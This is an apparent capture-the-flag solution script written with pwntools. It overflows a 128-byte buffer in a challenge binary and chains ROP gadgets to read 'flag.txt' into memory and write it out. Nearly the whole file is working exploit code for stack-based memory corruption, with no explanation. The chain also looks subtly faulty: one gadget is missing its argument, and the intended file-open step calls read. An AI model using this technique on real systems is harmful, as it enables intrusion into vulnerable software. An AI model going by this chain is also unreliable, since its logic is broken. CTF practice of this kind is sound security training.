#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")

context.binary = exe

gdb_script = '''
b *main
b *main+144
c
'''


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)
		
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    offset = 128    
    rop = ROP(exe)
    
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]
    pop_rdx = rop.find_gadget(["pop rdx", "pop rbx", "ret"])[0]

   
    read_plt = exe.sym["read"]
    write_plt = exe.sym["write"]
    bss_section = exe.bss() + 0x100 

   
    payload = b"A" * offset  
    payload += p64(pop_rdi)
    payload += p64(pop_rsi_r15) + p64(bss_section) + p64(0) 
    payload += p64(pop_rdx) + p64(8) 
    payload += p64(read_plt) 

   
    payload += p64(pop_rdi) + p64(bss_section) 
    payload += p64(pop_rsi_r15) + p64(0) + p64(0)  
    payload += p64(read_plt)

   
    payload += p64(pop_rdi) + p64(3) 
    payload += p64(pop_rsi_r15) + p64(bss_section + 0x10) + p64(0) 
    payload += p64(pop_rdx) + p64(0x40)  
    payload += p64(read_plt) 

   
    payload += p64(pop_rdi) + p64(1) 
    payload += p64(pop_rsi_r15) + p64(bss_section + 0x10) + p64(0)
    payload += p64(pop_rdx) + p64(0x40)  
    payload += p64(write_plt)
    payload +=p64(exe.sym.main)
   
    r.sendline(payload)
    r.sendline(b"flag.txt") 

    r.interactive()


if __name__ == "__main__":
    main()
